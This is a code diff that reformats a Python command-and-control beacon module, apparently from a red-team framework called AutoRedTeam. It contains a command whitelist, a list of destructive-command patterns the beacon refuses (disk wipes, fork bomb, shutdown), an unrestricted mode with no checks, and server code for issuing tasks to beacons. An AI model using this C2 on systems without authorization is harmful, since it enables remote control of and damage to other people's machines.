@@ -15,10 +15,10 @@ Beacon 通信模块 - Beacon Communication Module
 
 import asyncio
 import ipaddress
-import re
 import logging
 import os
 import platform
+import re
 import socket
 import ssl
 import subprocess
@@ -78,14 +78,45 @@ class BeaconConfig(C2Config):
         default_factory=lambda: frozenset(
             {
                 # 信息收集（只读）
-                "whoami", "id", "hostname", "uname", "ipconfig", "ifconfig",
-                "ip", "netstat", "ss", "arp", "route", "cat", "type",
-                "dir", "ls", "pwd", "echo", "set", "env", "printenv",
-                "systeminfo", "ver", "date", "uptime", "df", "free",
-                "ps", "tasklist", "wmic", "reg", "net",
+                "whoami",
+                "id",
+                "hostname",
+                "uname",
+                "ipconfig",
+                "ifconfig",
+                "ip",
+                "netstat",
+                "ss",
+                "arp",
+                "route",
+                "cat",
+                "type",
+                "dir",
+                "ls",
+                "pwd",
+                "echo",
+                "set",
+                "env",
+                "printenv",
+                "systeminfo",
+                "ver",
+                "date",
+                "uptime",
+                "df",
+                "free",
+                "ps",
+                "tasklist",
+                "wmic",
+                "reg",
+                "net",
                 # 网络工具
-                "ping", "nslookup", "dig", "traceroute", "tracert",
-                "curl", "wget",
+                "ping",
+                "nslookup",
+                "dig",
+                "traceroute",
+                "tracert",
+                "curl",
+                "wget",
             }
         )
     )
@@ -93,20 +124,18 @@ class BeaconConfig(C2Config):
     # standard 模式下额外阻止的危险模式（正则表达式）
     dangerous_patterns: List[str] = field(
         default_factory=lambda: [
-            r"rm\s+(-\w+\s+)*/(|\*)",      # rm 变体（目标为根目录，含拆分参数）
-            r"mkfs",                         # 磁盘格式化
-            r"dd\s+if=",                     # 磁盘写入
-            r">\s*/dev/sd",                  # 覆写磁盘设备
-            r"format\s+[a-zA-Z]:",           # Windows format
-            r":\(\)\s*\{",                   # fork bomb
+            r"rm\s+(-\w+\s+)*/(|\*)",  # rm 变体（目标为根目录，含拆分参数）
+            r"mkfs",  # 磁盘格式化
+            r"dd\s+if=",  # 磁盘写入
+            r">\s*/dev/sd",  # 覆写磁盘设备
+            r"format\s+[a-zA-Z]:",  # Windows format
+            r":\(\)\s*\{",  # fork bomb
             r"shutdown|reboot|halt|poweroff",  # 系统控制命令
         ]
     )
 
     # 路径安全配置 — 限制文件操作的允许目录
-    allowed_paths: List[str] = field(
-        default_factory=lambda: [tempfile.gettempdir()]
-    )
+    allowed_paths: List[str] = field(default_factory=lambda: [tempfile.gettempdir()])
 
     def __post_init__(self):
         """初始化后处理"""
@@ -129,9 +158,7 @@ class BeaconConfig(C2Config):
             self.command_mode = "restricted"
 
         # 预编译危险模式正则（避免每次命令执行时重编译）
-        self._compiled_dangerous_patterns = [
-            re.compile(p) for p in self.dangerous_patterns
-        ]
+        self._compiled_dangerous_patterns = [re.compile(p) for p in self.dangerous_patterns]
 
         # 同步端点配置
         self.checkin_path = self.checkin_endpoint
@@ -703,20 +730,13 @@ class Beacon(BaseC2):
             if self.config.command_mode == "restricted":
                 # 白名单模式：仅允许已知安全命令
                 if base_cmd not in self.config.command_whitelist:
-                    logger.warning(
-                        "Restricted 模式: 命令 '%s' 不在白名单中", base_cmd
-                    )
-                    return (
-                        f"[Error] Command '{base_cmd}' not in whitelist"
-                        f" (mode=restricted)"
-                    )
+                    logger.warning("Restricted 模式: 命令 '%s' 不在白名单中", base_cmd)
+                    return f"[Error] Command '{base_cmd}' not in whitelist" f" (mode=restricted)"
             elif self.config.command_mode == "standard":
                 # 标准模式：使用预编译正则阻止已知危险模式
                 for compiled_re in self.config._compiled_dangerous_patterns:
                     if compiled_re.search(cmd_lower):
-                        logger.warning(
-                            "Standard 模式: 命令匹配危险模式: %s", compiled_re.pattern
-                        )
+                        logger.warning("Standard 模式: 命令匹配危险模式: %s", compiled_re.pattern)
                         return "[Error] Command blocked by security policy"
             # unrestricted: 不检查（仅限明确授权场景）
 
@@ -811,8 +831,7 @@ class Beacon(BaseC2):
                 continue
 
         return False, (
-            f"路径 {resolved} 不在允许范围内 "
-            f"(allowed_paths={self.config.allowed_paths})"
+            f"路径 {resolved} 不在允许范围内 " f"(allowed_paths={self.config.allowed_paths})"
         )
 
     def _handle_cd(self, path: str) -> str:
@@ -1073,20 +1092,23 @@ class BeaconServer:
             (cert_path, key_path) 临时文件路径
         """
         try:
+            import datetime
+
             from cryptography import x509
             from cryptography.hazmat.primitives import hashes, serialization
             from cryptography.hazmat.primitives.asymmetric import rsa
             from cryptography.x509.oid import NameOID
-            import datetime
 
             # 生成 RSA 私钥
             key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 
             # 生成自签名证书
-            subject = issuer = x509.Name([
-                x509.NameAttribute(NameOID.COMMON_NAME, "AutoRedTeam C2"),
-                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "AutoRedTeam"),
-            ])
+            subject = issuer = x509.Name(
+                [
+                    x509.NameAttribute(NameOID.COMMON_NAME, "AutoRedTeam C2"),
+                    x509.NameAttribute(NameOID.ORGANIZATION_NAME, "AutoRedTeam"),
+                ]
+            )
 
             cert = (
                 x509.CertificateBuilder()
@@ -1097,10 +1119,12 @@ class BeaconServer:
                 .not_valid_before(datetime.datetime.utcnow())
                 .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
                 .add_extension(
-                    x509.SubjectAlternativeName([
-                        x509.DNSName("localhost"),
-                        x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
-                    ]),
+                    x509.SubjectAlternativeName(
+                        [
+                            x509.DNSName("localhost"),
+                            x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
+                        ]
+                    ),
                     critical=False,
                 )
                 .sign(key, hashes.SHA256())
@@ -1115,11 +1139,13 @@ class BeaconServer:
                 f.write(cert.public_bytes(serialization.Encoding.PEM))
 
             with open(key_path, "wb") as f:
-                f.write(key.private_bytes(
-                    serialization.Encoding.PEM,
-                    serialization.PrivateFormat.TraditionalOpenSSL,
-                    serialization.NoEncryption(),
-                ))
+                f.write(
+                    key.private_bytes(
+                        serialization.Encoding.PEM,
+                        serialization.PrivateFormat.TraditionalOpenSSL,
+                        serialization.NoEncryption(),
+                    )
+                )
 
             logger.info("自签名证书已生成: %s", cert_path)
             return cert_path, key_path
@@ -1133,9 +1159,7 @@ class BeaconServer:
         import shutil
 
         if not shutil.which("openssl"):
-            raise RuntimeError(
-                "无法生成 TLS 证书: cryptography 库未安装且 openssl 不在 PATH 中"
-            )
+            raise RuntimeError("无法生成 TLS 证书: cryptography 库未安装且 openssl 不在 PATH 中")
 
         cert_dir = tempfile.mkdtemp(prefix="art_c2_")
         cert_path = os.path.join(cert_dir, "server.crt")
@@ -1143,10 +1167,20 @@ class BeaconServer:
 
         subprocess.run(
             [
-                "openssl", "req", "-x509", "-newkey", "rsa:2048",
-                "-keyout", key_path, "-out", cert_path,
-                "-days", "365", "-nodes",
-                "-subj", "/CN=AutoRedTeam C2/O=AutoRedTeam",
+                "openssl",
+                "req",
+                "-x509",
+                "-newkey",
+                "rsa:2048",
+                "-keyout",
+                key_path,
+                "-out",
+                cert_path,
+                "-days",
+                "365",
+                "-nodes",
+                "-subj",
+                "/CN=AutoRedTeam C2/O=AutoRedTeam",
             ],
             check=True,
             capture_output=True,
@@ -1206,8 +1240,9 @@ class BeaconServer:
         with self._beacons_lock:
             return dict(self._sessions)
 
-    def send_task(self, beacon_id: str, task_type: str, payload: Any,
-                  timeout: float = 300.0) -> Optional[str]:
+    def send_task(
+        self, beacon_id: str, task_type: str, payload: Any, timeout: float = 300.0
+    ) -> Optional[str]:
         """
         向指定 beacon 下发任务
 
@@ -1348,9 +1383,7 @@ class BeaconServer:
         @web.middleware
         async def auth_middleware(request, handler):
             if not self._verify_api_key(request.headers):
-                return web.json_response(
-                    {"status": "error", "message": "unauthorized"}, status=401
-                )
+                return web.json_response({"status": "error", "message": "unauthorized"}, status=401)
             return await handler(request)
 
         if self._api_keys:
@@ -1368,13 +1401,17 @@ class BeaconServer:
                         session = self._sessions[beacon_id]
                         if not session.connected:
                             session.mark_reconnected()
-                            logger.info("Beacon 重连: %s (第 %d 次)", beacon_id, session.reconnect_count)
+                            logger.info(
+                                "Beacon 重连: %s (第 %d 次)", beacon_id, session.reconnect_count
+                            )
                         else:
                             session.info.last_seen = time.time()
                     else:
                         # 新 beacon
                         if len(self._sessions) >= self.max_beacons:
-                            logger.warning("达到最大 Beacon 数量限制 (%d)，拒绝新连接", self.max_beacons)
+                            logger.warning(
+                                "达到最大 Beacon 数量限制 (%d)，拒绝新连接", self.max_beacons
+                            )
                             return web.json_response(
                                 {"status": "error", "message": "server full"}, status=503
                             )
@@ -1388,9 +1425,7 @@ class BeaconServer:
                             ip_address=data.get("ip_address", ""),
                             pid=data.get("pid", 0),
                         )
-                        self._sessions[beacon_id] = BeaconSession(
-                            beacon_id=beacon_id, info=info
-                        )
+                        self._sessions[beacon_id] = BeaconSession(beacon_id=beacon_id, info=info)
                         # 向后兼容
                         self.beacons[beacon_id] = info
                         logger.info("New beacon: %s", beacon_id)
@@ -1447,7 +1482,7 @@ class BeaconServer:
                 session.add_result(result)
                 # 修剪结果列表
                 if len(session.results) > self.max_results_per_beacon:
-                    session.results = session.results[-self.max_results_per_beacon:]
+                    session.results = session.results[-self.max_results_per_beacon :]
 
             # 向后兼容
             with self._results_lock:
